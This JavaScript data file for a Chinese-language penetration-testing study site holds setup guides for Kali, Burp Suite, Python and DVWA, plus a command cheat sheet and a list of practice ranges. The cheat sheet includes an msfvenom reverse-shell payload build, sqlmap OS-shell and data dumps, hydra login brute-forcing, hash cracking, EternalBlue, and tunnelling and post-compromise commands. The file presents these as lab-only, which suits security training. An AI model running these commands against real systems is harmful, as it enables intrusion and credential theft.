/* ============================================================
   SEC//LAB · 核心数据：分类 / 安装主线 / 命令速查 / 靶场
   工具数据在 data-tools-1.js、data-tools-2.js 中 push 进来
   ============================================================ */

const CATS = [
  { id: "all",      name: "全部",           icon: "◈" },
  { id: "env",      name: "环境基础",       icon: "⬢" },
  { id: "recon",    name: "信息收集",       icon: "◎" },
  { id: "web",      name: "Web 渗透",       icon: "◈" },
  { id: "crack",    name: "密码破解",       icon: "⚿" },
  { id: "pentest",  name: "漏洞利用/内网",  icon: "✷" },
  { id: "reverse",  name: "逆向分析",       icon: "⌬" },
  { id: "forensics",name: "取证与流量",     icon: "⌖" }
];

const TOOLS   = [];   // 由 data-tools-*.js 填充
const GUIDES  = {};   // 安装主线
const CHEATS  = [];   // 命令速查
const RANGES  = [];   // 靶场

/* ------------------------------------------------------------
   安装主线（手把手，Windows 11 视角）
   ------------------------------------------------------------ */

GUIDES.vm = {
  title: "① 虚拟机 + Kali Linux：搭建你的攻击机",
  lead: "这是所有后续练习的地基。装好一台 Kali 虚拟机，你就有了一个随时可以「玩坏」的 Linux 环境，所有扫描、爆破、提权实验都在里面做，不会碰你自己的 Windows。",
  steps: [
    {
      t: "先确认硬件条件（3 分钟）",
      d: "Kali 虚拟机建议：CPU 4 核以上、内存 8G 以上、C 盘/数据盘留 80G 空闲。任务管理器 → 性能 → 看「虚拟化：已启用」。如果显示已禁用，进 BIOS 打开 Intel VT-x / AMD-V。",
      cmd: "systeminfo | findstr /i \"Hyper-V\"",
      hint: "开了 Hyper-V / WSL2 / 内存完整性（核心隔离）会和 VMware 抢虚拟化，导致 64 位虚拟机起不来。先在「启用或关闭 Windows 功能」里取消 Hyper-V，或改用 VirtualBox。"
    },
    {
      t: "下载虚拟机软件（二选一，新手推荐 VMware）",
      d: "VMware Workstation Pro 现在个人使用免费，注册 Broadcom 账号后可在下载页取到安装包；VirtualBox 开源免费、体积小、开箱即用。两个都能跑 Kali，选一个即可，不要同时装（会抢虚拟网卡）。",
      cmd: "https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion",
      hint: "不要下载任何「绿色破解版 VMware」——这是挖洞圈最大的木马投毒点，很多所谓便携版内置远控。"
    },
    {
      t: "安装虚拟机软件",
      d: "双击安装包 → 一路 Next（可改安装盘到 D 盘）→ 用户体验设置取消勾选「加入客户体验提升计划」→ 快捷方式随意 → Install → 完成后重启一次。安装过程中网络会短暂断开，属于正常（它装虚拟网卡）。"
    },
    {
      t: "下载 Kali 虚拟机镜像（推荐预装版，省 1 小时）",
      d: "打开 Kali 官方下载页，选「Virtual Machines」里的 VMware 或 VirtualBox 预装镜像（.7z 压缩包，约 3-4G）。国内下载慢就直接用清华镜像站，速度能到几 MB/s。",
      cmd: "https://mirrors.tuna.tsinghua.edu.cn/kali-images/current/",
      hint: "预装版解压后直接「打开虚拟机」即可用，账号密码都是 kali；安装版 ISO 需要自己走完图形安装流程，新手容易在分区那一步翻车。"
    },
    {
      t: "解压并导入虚拟机",
      d: "用 7-Zip 解压 .7z 到 D 盘（路径不要有中文和空格）。VMware：文件 → 打开 → 选解压出的 .vmx 文件。VirtualBox：管理 → 导入虚拟电脑 → 选 .ova。",
      cmd: "7z x kali-linux-2025.x-vmware-amd64.7z -oD:\\VMs\\",
      hint: "解压必须用 7-Zip 官方版，WinRAR 解 7z 大文件偶尔会损坏镜像，导致开机黑屏。"
    },
    {
      t: "调整虚拟机配置",
      d: "先别急着开机。编辑虚拟机设置：内存给 4096MB 以上、处理器 2-4 核、显存 128MB、网络适配器选 NAT（新手用 NAT 最省事，能上网但外部访问不到）。",
      hint: "网络模式区别：NAT=虚拟机可上网、宿主机可访问虚拟机；桥接=虚拟机像一台独立电脑，和宿主机同网段（做局域网抓包/靶场时用）；仅主机=只能宿主机互通。"
    },
    {
      t: "首次开机并改密码",
      d: "开机进入桌面（默认账号 kali / 密码 kali）。立刻改密码：打开终端执行 passwd，按提示输两遍新密码。改完执行 sudo apt update && sudo apt full-upgrade -y 更新系统。",
      cmd: "passwd && sudo apt update && sudo apt full-upgrade -y"
    },
    {
      t: "验证环境可用",
      d: "依次跑下面三条，都能出版本号，说明网络、包管理、工具链全部就绪。",
      cmd: "ip a && nmap --version && python3 --version",
      hint: "虚拟机没网：先看桌面右上角网络图标是否连接，再在 VMware「编辑 → 虚拟网络编辑器」里点「还原默认设置」。"
    },
    {
      t: "（可选但强烈建议）做快照",
      d: "关机状态下右键虚拟机 → 快照 → 拍摄快照，命名「干净基线」。以后练崩了直接回滚，30 秒恢复，不用重装。"
    }
  ]
};

GUIDES.burp = {
  title: "② Burp Suite 抓 HTTPS：证书 + 浏览器代理全流程",
  lead: "Burp 是 Web 渗透的核心工具。新手 90% 的卡点不是不会用，而是「装好了但网页提示不安全、啥都抓不到」——本质是 HTTPS 证书没配。这里一次配到底。",
  steps: [
    {
      t: "安装 Burp Suite Community",
      d: "下载页选 Community Edition（免费）。Windows 有自解压安装包，也有 .exe。装完默认路径在 C:\\Program Files\\BurpSuiteCommunity\\。它需要 Java，安装包已自带运行时，不用单独装 JDK。",
      cmd: "https://portswigger.net/burp/communitydownload",
      hint: "免费版够用：Proxy、Repeater、Decoder、Intruder（限速版）都有。缺少的 Scanner 可以用 Xray / nuclei 补。"
    },
    {
      t: "确认监听端口",
      d: "打开 Burp → Proxy → Options（新版在 Settings → Tools → Proxy）→ 看 Proxy listeners 是否为 127.0.0.1:8080。被占用就改成 8081。"
    },
    {
      t: "设置浏览器代理",
      d: "方案 A（推荐，隔离干净）：装 Firefox，设置 → 网络设置 → 手动配置代理 → HTTP 代理 127.0.0.1:8080，勾选「也将此代理用于 HTTPS」。方案 B：用 SwitchyOmega 插件一键切换。方案 C：Burp 内置浏览器（Proxy → Intercept → Open browser），零配置。",
      cmd: "127.0.0.1:8080",
      hint: "别把系统全局代理开太久，否则其他软件（微信、更新）也走 Burp，会报网络错误。"
    },
    {
      t: "导出 CA 证书",
      d: "浏览器访问 http://burp → 右上角 CA Certificate 下载 cacert.der。或者 Burp 里 Proxy → Options → Import/export CA certificate → Export → Certificate in DER format。"
    },
    {
      t: "把证书装进系统信任区",
      d: "双击 cacert.der → 安装证书 → 本地计算机 → 下一步 → 「将所有的证书都放入下列存储」→ 浏览 → 受信任的根证书颁发机构 → 确定 → 完成 → 弹安全警告点「是」。",
      cmd: "certutil -addstore -f Root cacert.der",
      hint: "必须选「受信任的根证书颁发机构」，装到「个人」里浏览器照样报错。装完重启浏览器。"
    },
    {
      t: "验证抓包成功",
      d: "开着 Intercept，浏览器访问任意 https 站点。Burp 的 HTTP history 出现记录、且状态码不是「Failed to connect」即成功。",
      cmd: "curl.exe -x http://127.0.0.1:8080 -k https://example.com -I",
      hint: "报 CERT_AUTHORITY_INVALID：证书没进信任区；报 ERR_TUNNEL_CONNECTION_FAILED：代理端口填错或 Burp 没开。"
    },
    {
      t: "装两个必备插件",
      d: "Extender → BApp Store 里搜索安装：Logger++（全量记录流量，方便回看）、Hackvertor 或 Turbo Intruder（高阶爆破）。插件装完要重启 Burp。"
    }
  ]
};

GUIDES.py = {
  title: "③ Python 工具环境：一条命令装齐常用库",
  lead: "大量安全工具是 Python 写的（sqlmap、impacket、XSStrike…）。环境配不好的典型症状：pip 装不上、命令找不到、装完 import 报错。核心是「版本 + 虚拟环境 + 国内源」三件事。",
  steps: [
    {
      t: "安装 Python 3.11 / 3.12（不要用 3.13+ 玩安全工具）",
      d: "官网下载 Windows installer (64-bit)。安装第一页必须勾选「Add python.exe to PATH」，然后选 Customize → 勾选 pip、py launcher。装到 C:\\Python312。",
      cmd: "https://www.python.org/downloads/windows/",
      hint: "很多工具（pycryptodome、lxml、impacket）尚未适配 3.13/3.14 的预编译包，装上去会卡在编译报错。3.11/3.12 是最稳的。"
    },
    {
      t: "验证并配置国内镜像源",
      d: "开 PowerShell 执行下面两条：第一条看版本，第二条把 pip 源换成清华，之后装包不再超时。",
      cmd: "python --version; python -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple --upgrade pip",
      hint: "如果提示 python 不是内部命令：环境变量没配上，重新运行安装包选 Modify → 勾 Add to PATH；或者直接用 py -3.12 调用。"
    },
    {
      t: "为每个工具建独立虚拟环境",
      d: "不要把所有包装进全局环境——依赖冲突会让你怀疑人生。每个工具目录下建一个 venv。",
      cmd: "cd D:\\tools\\sqlmap && py -3.12 -m venv .venv && .\\.venv\\Scripts\\Activate.ps1",
      hint: "PowerShell 报「无法加载文件，因为在此系统上禁止运行脚本」：执行 Set-ExecutionPolicy -Scope CurrentUser RemoteSigned 后重试。"
    },
    {
      t: "装常用安全库（按需）",
      d: "requests（HTTP）、pycryptodome（加密）、impacket（Windows 协议）、pwntools（PWN）、beautifulsoup4（解析）、dnspython（DNS 查询）。",
      cmd: "pip install requests pycryptodome beautifulsoup4 dnspython -i https://pypi.tuna.tsinghua.edu.cn/simple",
      hint: "装 pycryptodome 时报 Microsoft Visual C++ 14.0 required：装 VS Build Tools，或者优先用 wheel 版本（pip install --only-binary :all: pycryptodome）。"
    },
    {
      t: "把工具目录加进 PATH",
      d: "Win + R 输入 sysdm.cpl → 高级 → 环境变量 → 用户变量 Path → 新建 → 填 D:\\tools\\bin → 确定。之后在任意目录都能直接敲工具名。",
      cmd: "setx PATH \"%PATH%;D:\\tools\\bin\"",
      hint: "改完要重开终端才生效。setx 有 1024 字符长度限制，PATH 太长会截断，建议用图形界面加。"
    },
    {
      t: "验证一个真实工具跑通",
      d: "用 sqlmap 做端到端验证（目标必须是自己的 DVWA，见下一节）。",
      cmd: "python sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" --batch --dbs",
      hint: "报 ModuleNotFoundError：venv 没激活；报 connection refused：DVWA 没启动或端口不对。"
    }
  ]
};

GUIDES.dvwa = {
  title: "④ 本地 DVWA 靶场：一个漏洞练到手熟",
  lead: "DVWA（Damn Vulnerable Web Application）是最经典的入门靶场：SQL 注入、XSS、文件上传、命令执行、CSRF 全都有，还能一键调难度。装在本地，随便打不担心违法。",
  steps: [
    {
      t: "准备 Web 环境（三选一）",
      d: "① phpStudy 小皮面板：一键装 Apache+PHP+MySQL，最适合新手；② 直接装 XAMPP；③ 用 Docker：docker run -d -p 8080:80 vulnerables/web-dvwa。本文按 phpStudy 讲。",
      cmd: "https://www.xp.cn/",
      hint: "phpStudy 装完要确认 Apache 和 MySQL 都是绿色运行状态；80/3306 端口被占就改成 8081/3307。"
    },
    {
      t: "下载 DVWA 源码",
      d: "从 GitHub 官方仓库下载 zip，解压到 phpStudy 的 WWW 目录下，文件夹改名 dvwa。",
      cmd: "git clone https://github.com/digininja/DVWA.git D:\\phpstudy_pro\\WWW\\dvwa",
      hint: "不要从第三方「整合包/汉化版」下载——那是 webshell 常见藏身处。要中文界面自己改文件即可。"
    },
    {
      t: "创建数据库配置文件",
      d: "进 dvwa/config 目录，把 config.inc.php.dist 复制一份改名 config.inc.php，用 PhpStorm 打开，把 db_user / db_password 改成你的 MySQL 账号密码（phpStudy 默认 root/root）。",
      cmd: "copy config.inc.php.dist config.inc.php"
    },
    {
      t: "访问安装页并初始化",
      d: "浏览器打开 http://127.0.0.1/dvwa/setup.php → 拉到最下面点「Create / Reset Database」→ 自动跳转登录页。默认账号 admin，密码 password。",
      cmd: "http://127.0.0.1/dvwa/setup.php",
      hint: "页面一片空白或报 500：PHP 版本太低（要 7.4+）或缺扩展，去 php.ini 打开 mysqli、gd、allow_url_fopen。"
    },
    {
      t: "把难度调到 Low",
      d: "登录后左侧 DVWA Security → Security Level 选 Low → Submit。Low 级别才是「教科书式漏洞」，适合第一次手工验证。"
    },
    {
      t: "跑通第一个注入（配套验证）",
      d: "进 SQL Injection 页面，输入框填 1，点 Submit。再用 Burp 抓这个请求，把请求丢给 sqlmap 复现：第一步手工看到报错回显，第二步工具跑出库名，两步都对上才算真的学会了。",
      cmd: "sqlmap -r request.txt --batch --dbs",
      hint: "只在自己的 127.0.0.1 上跑。同样的命令对任何别人的站点执行，性质就是刑法 285 条。"
    }
  ]
};

/* ------------------------------------------------------------
   命令速查
   ------------------------------------------------------------ */
CHEATS.push(
  { tool: "nmap", note: "主机/端口/服务探测", items: [
    { cmd: "nmap -sT -Pn --top-ports 1000 192.168.1.10", why: "TCP 连接扫描，无需管理员权限，最稳" },
    { cmd: "nmap -sV -sC -p 80,443,3389 192.168.1.10", why: "识别服务版本 + 跑默认脚本" },
    { cmd: "nmap -p- --min-rate 1000 192.168.1.10 -oN all.txt", why: "全端口扫描并保存结果（靶场用）" },
    { cmd: "nmap -sn 192.168.1.0/24", why: "只探活，快速找同网段在线主机" }
  ]},
  { tool: "curl", note: "手工发请求 / 验证响应头", items: [
    { cmd: "curl.exe -sI https://example.com", why: "只看响应头，判断状态码与跳转（PowerShell 必须写 curl.exe）" },
    { cmd: "curl.exe -x http://127.0.0.1:8080 -k https://example.com -I", why: "走 Burp 代理验证抓包是否生效" },
    { cmd: "curl.exe -s -o NUL -w \"%{http_code} %{size_download}\\n\" https://example.com", why: "只输出状态码与大小" },
    { cmd: "curl.exe -s https://example.com/api -H \"Content-Type: application/json\" -d \"{\\\"id\\\":1}\"", why: "发 JSON POST 测接口" }
  ]},
  { tool: "sqlmap", note: "SQL 注入自动化验证", items: [
    { cmd: "sqlmap -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" --batch --dbs", why: "列出所有数据库（--batch 防止卡在交互；DVWA 需加 --cookie）" },
    { cmd: "sqlmap -r req.txt --batch -D dvwa -T users --dump", why: "导出指定表数据（req.txt 来自 Burp 保存的请求）" },
    { cmd: "sqlmap -r req.txt -p id --batch --level 3 --risk 2", why: "从 Burp 保存的请求文件测试，指定参数" },
    { cmd: "sqlmap -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1\" --batch --os-shell", why: "尝试拿系统命令执行（高危，仅靶场）" }
  ]},
  { tool: "ffuf / gobuster", note: "目录与子域爆破", items: [
    { cmd: "ffuf -u http://target/FUZZ -w dict.txt -mc 200,301,302", why: "目录爆破，只显示有意义的响应码" },
    { cmd: "gobuster dir -u http://target -w dict.txt -x php,bak,zip", why: "带后缀的目录扫描" },
    { cmd: "ffuf -u http://FUZZ.target.com -w subs.txt -mc all -fs 0", why: "子域枚举，过滤空响应" }
  ]},
  { tool: "hydra", note: "口令爆破（仅在自有靶场）", items: [
    { cmd: "hydra -l admin -P pass.txt 192.168.1.10 ssh -t 4", why: "单用户 + 字典爆破 SSH" },
    { cmd: "hydra -L users.txt -p Passw0rd 192.168.1.10 rdp", why: "撞库式测试（低速率避免锁号）" },
    { cmd: "hydra -l admin -P pass.txt 192.168.1.10 http-post-form \"/login:u=^USER^&p=^PASS^:F=invalid\"", why: "Web 表单登录爆破" }
  ]},
  { tool: "hashcat", note: "哈希离线破解", items: [
    { cmd: "hashcat -m 1000 hash.txt rockyou.txt", why: "-m 1000 = NTLM；-m 0 = MD5；-m 1800 = sha512crypt" },
    { cmd: "hashcat -m 0 hash.txt dict.txt -r rules/best64.rule", why: "加规则变形，命中率显著提升" },
    { cmd: "hashcat -m 22000 handshake.hc22000 dict.txt", why: "WPA 握手包破解" },
    { cmd: "hashcat --example-hashes | more", why: "查哈希类型编号" }
  ]},
  { tool: "msfconsole", note: "漏洞利用框架", items: [
    { cmd: "msfconsole -q", why: "静默启动，跳过 banner" },
    { cmd: "search type:exploit platform:windows smb", why: "按类型/平台搜模块" },
    { cmd: "use exploit/windows/smb/ms17_010_eternalblue", why: "选中模块后用 show options 看必填项" },
    { cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe", why: "生成 payload（仅授权测试）" }
  ]},
  { tool: "Linux 排查", note: "拿到 shell 后先看什么", items: [
    { cmd: "id && uname -a && cat /etc/os-release", why: "身份、内核版本（决定提权方向）" },
    { cmd: "sudo -l", why: "看能用 sudo 执行什么，最常见提权点" },
    { cmd: "find / -perm -4000 -type f 2>/dev/null", why: "找 SUID 程序" },
    { cmd: "netstat -antp 2>/dev/null || ss -antp", why: "看监听端口与内网可达服务" }
  ]},
  { tool: "Windows 排查", note: "落地后的基础动作", items: [
    { cmd: "whoami /priv", why: "看当前令牌权限（SeImpersonate 等）" },
    { cmd: "systeminfo", why: "系统版本/补丁，对照 CVE 找本地提权" },
    { cmd: "net user && net localgroup administrators", why: "用户与管理员组成员" },
    { cmd: "tasklist /svc", why: "进程与服务对应关系，找可劫持项" }
  ]},
  { tool: "代理与隧道", note: "内网穿透（靶场环境）", items: [
    { cmd: "chisel server -p 8080 --reverse", why: "公网侧起服务端" },
    { cmd: "chisel client 1.2.3.4:8080 R:socks", why: "内网侧连回，本地开 SOCKS5 1080" },
    { cmd: "proxychains4 nmap -sT -Pn 10.0.0.5", why: "通过代理扫内网" },
    { cmd: "ssh -L 8080:127.0.0.1:80 user@host", why: "SSH 本地端口转发" }
  ]}
);

/* ------------------------------------------------------------
   靶场 / 练习平台
   ------------------------------------------------------------ */
RANGES.push(
  { name: "DVWA", lv: "easy", lvText: "入门", desc: "本地 PHP 靶场，十四类经典漏洞 + 四档难度，最适合第一次手工验证。", url: "https://github.com/digininja/DVWA" },
  { name: "OWASP Juice Shop", lv: "easy", lvText: "入门", desc: "现代 SPA 电商靶场，覆盖 OWASP Top 10，有积分榜，Docker 一行启动。", url: "https://owasp.org/www-project-juice-shop/" },
  { name: "Vulhub", lv: "mid", lvText: "进阶", desc: "几百个真实 CVE 的 Docker 复现环境（log4j、fastjson、shiro…），漏洞研究必备。", url: "https://github.com/vulhub/vulhub" },
  { name: "PortSwigger Web Security Academy", lv: "mid", lvText: "进阶", desc: "Burp 官方免费课程 + 在线实验，讲解质量业内顶级，SQLi/XSS/SSRF 全有 Lab。", url: "https://portswigger.net/web-security" },
  { name: "TryHackMe", lv: "easy", lvText: "入门", desc: "引导式渗透路线图，从 Linux 基础到内网，带在线虚拟机，中文社区资料多。", url: "https://tryhackme.com/" },
  { name: "Hack The Box", lv: "hard", lvText: "高阶", desc: "退役靶机 + 赛季排名，接近真实渗透强度，适合打完 THM 之后进阶。", url: "https://www.hackthebox.com/" },
  { name: "VulnHub", lv: "mid", lvText: "进阶", desc: "免费下载虚拟机镜像，离线打靶，适合没有稳定网络的场景。", url: "https://www.vulnhub.com/" },
  { name: "攻防世界 XCTF", lv: "mid", lvText: "进阶", desc: "国内 CTF 练习平台，Web/Misc/Reverse/Crypto 分区清晰，新手区题目友好。", url: "https://adworld.xctf.org.cn/" },
  { name: "墨者学院", lv: "easy", lvText: "入门", desc: "国内在线靶场，漏洞场景按类型分类，适合边学边练，部分免费。", url: "https://www.mozhe.cn/" }
);
